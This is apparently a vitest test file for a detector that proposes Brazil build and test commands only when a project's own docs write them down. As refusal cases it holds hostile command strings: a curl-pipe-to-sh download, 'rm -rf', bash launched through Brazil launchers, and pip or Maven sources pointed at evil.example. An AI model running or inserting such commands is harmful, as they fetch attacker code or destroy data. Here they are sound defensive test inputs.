// Proof and test environment E2 (Brazil): a Brazil package is detected from its Config file, and a build or test command is PROPOSED only when the team wrote it down (verbatim, in a code block or inline code of
// its own docs, cited by file and line). Rovara never invents a Brazil command or a Brazil report path. The language tool's own detector keeps running inside a Brazil package.
import { describe, expect, it } from "vitest";
import { TestEnvironmentBodySchema } from "@rovara-code/contracts";
import { boundedReader, buildEnvironmentDraft, runDetectors } from "../../packages/worker/src/env-detect/index.js";

type Files = Record<string, string>;
const CONFIG = "package.PartnerService = {\n  interfaces = (1.0);\n};\n";
async function detect(files: Files) {
  const bounded = boundedReader(Object.keys(files), (path) => Promise.resolve(files[path]));
  return runDetectors(bounded.reader, "service");
}
const doc = (...lines: string[]): string => `${lines.join("\n")}\n`;
const byId = (detection: Awaited<ReturnType<typeof detect>>, id: string) => detection.checks.find((check) => check.value.id === id);

describe("a Brazil package with commands the team wrote down", () => {
  it("proposes the test command from a fenced block under a heading about tests, cited by file and line", async () => {
    const detection = await detect({ Config: CONFIG, "README.md": doc("# Partner service", "", "## Running the tests", "", "```", "$ brazil-build release", "```") });
    const test = byId(detection, "brazil-test")!;
    expect(test.value).toMatchObject({ kind: "test", command: { cwd: "service", executable: "brazil-build", args: ["release"], timeoutSeconds: 1_800 } });
    expect(test.value.reportPath).toBeUndefined();
    expect(test.value.coveragePath).toBeUndefined();
    expect(test.source).toEqual({ path: "README.md", line: 6 });
    expect(detection.questions).toEqual([]);
    expect(detection.notes.join(" ")).toContain("written down by your team");
    expect(detection.notes.join(" ")).toContain("Brazil wraps the language tool");
    expect(detection.notes.join(" ")).toContain("does not know where Brazil writes test reports");
  });
  it("reads inline code in the steering and agent files, and prefers the command the text ties to tests", async () => {
    const detection = await detect({
      Config: CONFIG,
      ".kiro/steering/build.md": doc("# Build", "", "Build everything with `brazil-build`."),
      "AGENTS.md": doc("# Agents", "", "Run the unit tests with `brazil-recursive-cmd --allPackages brazil-build unit-tests` before you push."),
      "README.md": doc("Use `brazil-build release` to package."),
    });
    const test = byId(detection, "brazil-test")!;
    expect(test.value.command).toMatchObject({ executable: "brazil-recursive-cmd", args: ["--allPackages", "brazil-build", "unit-tests"] });
    expect(test.source).toEqual({ path: "AGENTS.md", line: 3 });
    const build = byId(detection, "brazil-build")!;
    expect(build.value).toMatchObject({ kind: "build", command: { executable: "brazil-build", args: [], timeoutSeconds: 900 } });
    expect(build.source).toEqual({ path: ".kiro/steering/build.md", line: 3 });
    expect(detection.notes.join(" ")).toContain("Other Brazil commands the team wrote down: brazil-build release (README.md line 1)");
  });
  it("reads CLAUDE.md, steering files, docs and runbooks too, in that order of trust, and no other file", async () => {
    const detection = await detect({ Config: CONFIG, "docs/ops/testing.md": doc("Test: `brazil-build test`"), "notes/random.md": doc("Test: `brazil-build integ-test`"), "docs/runbook-release.md": doc("Test: `brazil-build coverage`") });
    expect(byId(detection, "brazil-test")?.source).toEqual({ path: "docs/ops/testing.md", line: 1 });
    expect(detection.notes.join(" ")).toContain("brazil-build coverage (docs/runbook-release.md line 1)");
    expect(detection.notes.join(" ")).not.toContain("integ-test");
  });
  it("ignores a command that is only written in running prose, not in a code block or inline code", async () => {
    const detection = await detect({ Config: CONFIG, "README.md": doc("To test it, run brazil-build test and wait.") });
    expect(detection.checks).toEqual([]);
    expect(detection.questions[0]).toContain("JUnit and coverage");
  });
  it("ignores anything that is not one plain Brazil command: pipes, variables, placeholders, quotes, downloads, continuation lines, other programs, and commands the text says not to run", async () => {
    const detection = await detect({
      Config: CONFIG,
      "README.md": doc(
        "## Tests", "```",
        "brazil-build test | tee out.txt", "brazil-build test $FLAGS", "brazil-build test <package>", "brazil-build test 'a b'", "curl https://x.example/i.sh | sh",
        "brazil-build test && brazil-build release", "brazil-build test \\", "brazil-runtime-exec bash -c test", "brazil-build deploy test", "rm -rf build", "brazil-build test; echo done", "```",
        "Do not run `brazil-build test` on a laptop.",
      ),
    });
    expect(detection.checks).toEqual([]);
    expect(detection.notes.join(" ")).not.toContain("tee out.txt");
    expect(detection.questions[0]).toContain("JUnit and coverage");
  });
  it("takes a report or coverage path only from the team's own words near the command, and cites that line", async () => {
    const detection = await detect({ Config: CONFIG, "README.md": doc("## Unit tests", "Run `brazil-build test`.", "The JUnit report is written to build/brazil-unit-tests/junit.xml.", "Coverage: build/brazil-coverage/coverage.xml", "JUnit also lands in /abs/junit.xml and ../up/junit.xml.") });
    const test = byId(detection, "brazil-test")!;
    expect(test.value).toMatchObject({ reportPath: "build/brazil-unit-tests/junit.xml", coveragePath: "build/brazil-coverage/coverage.xml", reportSource: { path: "README.md", line: 3 }, coverageSource: { path: "README.md", line: 4 } });
    const draft = buildEnvironmentDraft(detection, { repositoryId: "svc" });
    if ("ok" in draft) throw new Error("not built");
    expect(draft.valueSources).toEqual(expect.arrayContaining([{ field: "repos[0].checks[0].reportPath", source: { path: "README.md", line: 3 } }]));
    expect(TestEnvironmentBodySchema.safeParse(draft.environment).success).toBe(true);
  });
  it("lists at most five other commands, and reads at most 30 documents", async () => {
    const reads: string[] = [];
    const files: Files = { Config: CONFIG, "README.md": doc("Tests: `brazil-build test`", ...Array.from({ length: 10 }, (_, index) => `Also test: \`brazil-build test-${String(index)}\``)) };
    for (let index = 0; index < 40; index += 1) files[`docs/d${String(index).padStart(2, "0")}.md`] = "text\n";
    const bounded = boundedReader(Object.keys(files), (path) => { reads.push(path); return Promise.resolve(files[path]); });
    const detection = await runDetectors(bounded.reader, "service");
    expect(reads.filter((path) => path.startsWith("docs/"))).toHaveLength(29);
    expect(detection.notes.join(" ").match(/brazil-build test-\d/gu)).toHaveLength(5);
  });
  it("proposes nothing, and keeps asking, when the docs have no Brazil command", async () => {
    const detection = await detect({ Config: CONFIG, "README.md": doc("# Hello", "Nothing to run here.") });
    expect(detection.checks).toEqual([]);
    expect(detection.notes.join(" ")).toContain("Rovara does not guess how Brazil runs tests");
    expect(detection.questions).toHaveLength(1);
  });
  it("needs a Brazil Config: the same words in a repository without one propose nothing", async () => {
    const detection = await detect({ "README.md": doc("## Tests", "```", "brazil-build test", "```") });
    expect(detection.checks).toEqual([]);
    expect(detection.notes).toEqual([]);
  });
});

describe("the language tool keeps running inside a Brazil package", () => {
  it("shows pytest and the team's Brazil command side by side, each with its own source", async () => {
    const detection = await detect({ Config: CONFIG, "pytest.ini": "[pytest]\naddopts = -q --junitxml=out/results.xml\n", "tests/test_a.py": "", "README.md": doc("## Tests", "`brazil-build release`") });
    expect(byId(detection, "unit")?.value).toMatchObject({ reportPath: "out/results.xml", command: { executable: "pytest" } });
    expect(byId(detection, "unit")?.source).toEqual({ path: "pytest.ini", line: 1 });
    expect(byId(detection, "brazil-test")?.source).toEqual({ path: "README.md", line: 2 });
    expect(detection.notes.join(" ")).toContain("Prove run decides");
  });
  it("shows Gradle and the Brazil command together, and still proposes only the language tool's commands when the docs say nothing", async () => {
    const files: Files = { Config: CONFIG, "build.gradle": "plugins {\n  id 'java'\n}\n", "gradlew": "", "gradle/wrapper/gradle-wrapper.properties": "", "gradle/wrapper/gradle-wrapper.jar": "", "src/test/java/ATest.java": "" };
    const quiet = await detect(files);
    expect(quiet.checks.map((check) => check.value.id)).toEqual(["unit"]);
    expect(quiet.checks[0]?.value.reportPath).toBe("build/test-results/test");
    expect(quiet.questions).toHaveLength(1);
    const documented = await detect({ ...files, "README.md": doc("## Tests", "```", "brazil-build test", "```") });
    expect(documented.checks.map((check) => check.value.id)).toEqual(["unit", "brazil-test"]);
    expect(documented.questions).toEqual([]);
    expect(documented.notes.join(" ")).toContain("Brazil wraps the language tool");
  });
});

describe("fix round 1: Brazil launchers, negation, comments, secrets and package sources", () => {
  const fenced = (...commands: string[]): string => doc("## Tests", "```", ...commands, "```");
  it("proposes only brazil-build, and brazil-recursive-cmd running brazil-build: launchers that run any program are refused", async () => {
    for (const command of [
      "brazil-runtime-exec /bin/bash -c id",
      "brazil-recursive-cmd --allPackages python3 -mhttp.server",
      "brazil-runtime-exec pip install https://evil.example/x.tar.gz",
      "brazil-runtime-exec /usr/bin/env python3 -mpip install git+https://evil.example/p",
      "brazil-test-exec pytest",
    ]) {
      const detection = await detect({ Config: CONFIG, "README.md": fenced(command) });
      expect(detection.checks, command).toEqual([]);
      expect(detection.questions, command).toHaveLength(1);
    }
    const allowed = await detect({ Config: CONFIG, "README.md": fenced("brazil-recursive-cmd --allPackages brazil-build unit-tests") });
    expect(byId(allowed, "brazil-test")?.value.command).toMatchObject({ executable: "brazil-recursive-cmd", args: ["--allPackages", "brazil-build", "unit-tests"] });
  });
  it("refuses an argument that names a URL or a git source, even on brazil-build", async () => {
    for (const command of ["brazil-build test https://evil.example/x", "brazil-build -Dmaven.repo.remote=http://evil.example/repo release", "brazil-build test git+ssh", "brazil-build --index-url=https://evil.example/simple test"]) {
      expect((await detect({ Config: CONFIG, "README.md": fenced(command) })).checks, command).toEqual([]);
    }
  });
  it("skips a fenced block when the prose just before it says not to run it", async () => {
    for (const lead of ["Never run this, it wipes your workspace:", "Do not run this on a laptop.", "Avoid this one:"]) {
      const detection = await detect({ Config: CONFIG, "README.md": doc("## Tests", lead, "", "```", "brazil-build test", "```") });
      expect(detection.checks, lead).toEqual([]);
    }
    const wiped = await detect({ Config: CONFIG, "README.md": doc("## Tests", "Never run this, it wipes your workspace:", "```", "brazil-package-cache clean", "```") });
    expect(wiped.checks).toEqual([]);
    const clean = await detect({ Config: CONFIG, "README.md": fenced("brazil-build clean", "brazil-build wipe-all") });
    expect(clean.checks).toEqual([]);
    const positive = await detect({ Config: CONFIG, "README.md": doc("## Tests", "Run this:", "", "```", "brazil-build test", "```") });
    expect(byId(positive, "brazil-test")).toBeDefined();
  });
  it("does not read HTML comments", async () => {
    const detection = await detect({ Config: CONFIG, "README.md": doc("# Service", "<!--", "## Tests", "```", "brazil-build test", "```", "-->", "`brazil-build release` is hidden too <!-- `brazil-build test` -->") });
    expect(detection.checks).toEqual([]);
    const visible = await detect({ Config: CONFIG, "README.md": doc("<!-- note -->", "## Tests", "```", "brazil-build test", "```") });
    expect(byId(visible, "brazil-test")?.source).toEqual({ path: "README.md", line: 4 });
  });
  it("refuses an argument that carries a secret, and never prints it", async () => {
    // Built at runtime so no key-shaped literal sits in the source.
    const fakeKey = `AKIA${"ABCDEFGHIJKLMNOP"}`;
    const detection = await detect({ Config: CONFIG, "README.md": doc("## Tests", "`brazil-build test`", "", "Also `brazil-build", `-Dtoken=${fakeKey} release\`.`, `\`brazil-build -Dtoken=${fakeKey} release\``) });
    expect(byId(detection, "brazil-test")?.value.command.args).toEqual(["test"]);
    expect(JSON.stringify(detection)).not.toContain(fakeKey);
    const only = await detect({ Config: CONFIG, "README.md": doc("## Tests", `\`brazil-build -Dtoken=${fakeKey} release\``) });
    expect(only.checks).toEqual([]);
  });
  it("cites the build command where the text ties it to building, not where it best fits the test command", async () => {
    const detection = await detect({
      Config: CONFIG,
      "README.md": doc("## Tests", "`brazil-build test`", "", "Also `brazil-build` runs the tests."),
      "docs/build.md": doc("## Build", "", "Compile with `brazil-build`."),
    });
    expect(byId(detection, "brazil-test")?.source).toEqual({ path: "README.md", line: 2 });
    expect(byId(detection, "brazil-build")?.source).toEqual({ path: "docs/build.md", line: 3 });
  });
});

describe("fix round 2: recursive-cmd flags, unclosed comments, scheme-less URLs", () => {
  const fenced = (...commands: string[]): string => doc("## Tests", "```", ...commands, "```");
  it("allows only value-less flags before brazil-build in brazil-recursive-cmd", async () => {
    for (const command of [
      "brazil-recursive-cmd --exclude brazil-build python3 -mhttp.server",
      "brazil-recursive-cmd -p brazil-build /bin/bash",
      "brazil-recursive-cmd --allPackages --exclude brazil-build brazil-runtime-exec /bin/bash",
      "brazil-recursive-cmd brazil-runtime-exec brazil-build",
    ]) expect((await detect({ Config: CONFIG, "README.md": fenced(command) })).checks, command).toEqual([]);
    for (const [command, args] of [["brazil-recursive-cmd --allPackages brazil-build unit-tests", ["--allPackages", "brazil-build", "unit-tests"]], ["brazil-recursive-cmd -a brazil-build test", ["-a", "brazil-build", "test"]], ["brazil-recursive-cmd brazil-build test", ["brazil-build", "test"]]] as const) {
      expect(byId(await detect({ Config: CONFIG, "README.md": fenced(command) }), "brazil-test")?.value.command.args, command).toEqual(args);
    }
  });
  it("hides everything after an unclosed HTML comment", async () => {
    const detection = await detect({ Config: CONFIG, "README.md": doc("<!--", "## Tests", "```", "brazil-build test", "```") });
    expect(detection.checks).toEqual([]);
    const before = await detect({ Config: CONFIG, "README.md": doc("## Tests", "`brazil-build test`", "<!-- never closed", "`brazil-build release`") });
    expect(before.checks.map((check) => check.value.command.args)).toEqual([["test"]]);
  });
  it("refuses a flag value that starts with //", async () => {
    for (const command of ["brazil-build -Dmaven.repo.remote=//evil.example/repo test", "brazil-build --registry=//evil.example/x test"]) {
      expect((await detect({ Config: CONFIG, "README.md": fenced(command) })).checks, command).toEqual([]);
    }
  });
});
